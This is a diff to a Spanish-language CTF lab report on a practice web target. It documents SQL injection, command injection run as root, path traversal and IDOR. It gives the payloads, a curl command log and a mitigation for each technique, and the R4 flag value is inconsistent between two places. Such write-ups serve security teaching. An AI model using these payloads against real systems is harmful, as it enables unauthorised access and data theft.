@@ -22,17 +22,20 @@ Estado obtenido mediante `./ctf status 07`:
 R1 ✓ SQLi - bypass de autenticacion
 R2 ✓ SQLi - extraccion de datos con UNION
 R3 ✓ Inyeccion de comandos (RCE)
-R4 Pendiente
-R5 Pendiente
+R4 ✓ Path traversal
+R5 ✓ IDOR
 
-Progreso: 3/5 (60%)
+Progreso: 5/5 (100%)
 ```
 
 Flags verificadas:
 
 - R1: `FLAG{sqli_auth_bypass}`
 - R2: `FLAG{sqli_union_dump}`
-- R2: `FLAG{command_injection_rce}`
+- R3: `FLAG{command_injection_rce}`
+- R4: `FLAG{cpath_traversal_lfi}`
+- R5: `FLAG{idor_broken_access}`
+
 
 ## 2. Tabla de explotación
 
@@ -41,8 +44,8 @@ Flags verificadas:
 | SQLi auth (R1) | `user=admin' --` y contraseña arbitraria. | La comilla cierra el valor del usuario y `--` comenta el resto de la consulta SQL. | Acceso al panel de administración sin conocer la contraseña. | Consultas parametrizadas y almacenamiento seguro de contraseñas mediante hashes. |
 | SQLi UNION (R2) | `%' UNION SELECT clave,valor FROM secrets-- ` | Se combina la consulta original con `SELECT clave,valor FROM secrets`. | Extracción de información confidencial de la base de datos. | Consultas parametrizadas, validación de entradas y principio de mínimo privilegio. |
 | Command injection (R3) | `host=127.0.0.1; id` y `host=127.0.0.1; cat /app/flags/cmdi.txt` | El servidor ejecutó `ping -c1 127.0.0.1; id` y luego `cat /app/flags/cmdi.txt`. | Ejecución remota de comandos con privilegios de root y lectura de archivos del servidor. | Evitar construir comandos mediante concatenación de entradas. Utilizar APIs seguras, listas permitidas de valores y ejecutar el servicio con privilegios mínimos. |
-| Path traversal (R4) | Pendiente. | Pendiente. | Pendiente. | Pendiente. |
-| IDOR (R5) | Pendiente. | Pendiente. | Pendiente. | Pendiente. |
+| Path Traversal (R4) | `archivo=../../app/flags/lfi.txt` | El servidor intentó abrir `/app/public/../../app/flags/lfi.txt` y devolvió el contenido de `lfi.txt`. | Lectura de archivos fuera del directorio público y exposición de información sensible. | Canonicalizar y validar las rutas, restringir el acceso al directorio permitido y evitar que el usuario controle rutas arbitrarias. |
+| IDOR (R5) | `id=1` en `/perfil` | El servidor devolvió el perfil del administrador, incluyendo su nota privada y la flag. | Acceso no autorizado a información de otro usuario. | Obtener la identidad desde la sesión autenticada y verificar en el servidor que el usuario tenga permiso para acceder al recurso solicitado. |
 
 ## 3. Preguntas de análisis
 
@@ -74,8 +77,6 @@ Esto permitió obtener información de la tabla `secrets`.
 
 **P3 — ¿Qué sigue después del RCE?**
 
-**P3 — ¿Qué sigue después del RCE?**
-
 Después de conseguir ejecución remota de comandos, un atacante podría intentar
 mantener persistencia en el sistema, obtener mayores privilegios, acceder a
 otros recursos internos, extraer información confidencial o comprometer otros
@@ -84,11 +85,17 @@ root, lo que aumenta considerablemente el impacto de la vulnerabilidad.
 
 **P4 — ¿Por qué parametrizar evita la SQLi?**
 
-Pendiente.
+La parametrización evita la inyección SQL porque separa las instrucciones de la consulta SQL de los datos proporcionados por el usuario. En lugar de concatenar directamente los valores ingresados dentro de una consulta, se utilizan parámetros que la base de datos interpreta exclusivamente como datos y no como parte del código SQL.
+
+De esta manera, aunque un atacante ingrese caracteres especiales o instrucciones SQL maliciosas, estos no pueden modificar la estructura original de la consulta. Esto permite prevenir ataques como el bypass de autenticación y la extracción no autorizada de información mediante SQL Injection.
 
 **P5 — ¿Dónde va el control de acceso (IDOR)?**
 
-Pendiente.
+Porque el cliente puede modificar fácilmente los parámetros de una solicitud HTTP.
+Si el servidor confía en el ID recibido sin comprobar los permisos, un usuario puede
+acceder a información de otras cuentas, como ocurrió en el reto R5 al cambiar
+`id=3` por `id=1`. La autorización debe verificarse siempre en el servidor,
+comprobando que el usuario autenticado tenga permiso para acceder al recurso.
 
 ## 4. Bitácora de comandos
 
@@ -125,3 +132,27 @@ curl -iG "http://phantomcorp/herramientas/ping" \
 ```
 
 Resultado: ejecución de comandos como root y obtención de `FLAG{command_injection_rce}`.
+
+**R4 — Path traversal:**
+
+```bash
+curl -iG "http://phantomcorp/descargar" \
+  --data-urlencode "archivo=archivo.txt"
+
+curl -iG "http://phantomcorp/descargar" \
+  --data-urlencode "archivo=../../app/flags/lfi.txt"
+```
+
+Resultado: FLAG{path_traversal_lfi}.
+
+**R5 — IDOR:**
+
+```bash
+curl -iG "http://phantomcorp/perfil" \
+  --data-urlencode "id=3"
+
+curl -iG "http://phantomcorp/perfil" \
+  --data-urlencode "id=1"
+```
+
+Resultado: FLAG{idor_broken_access}.
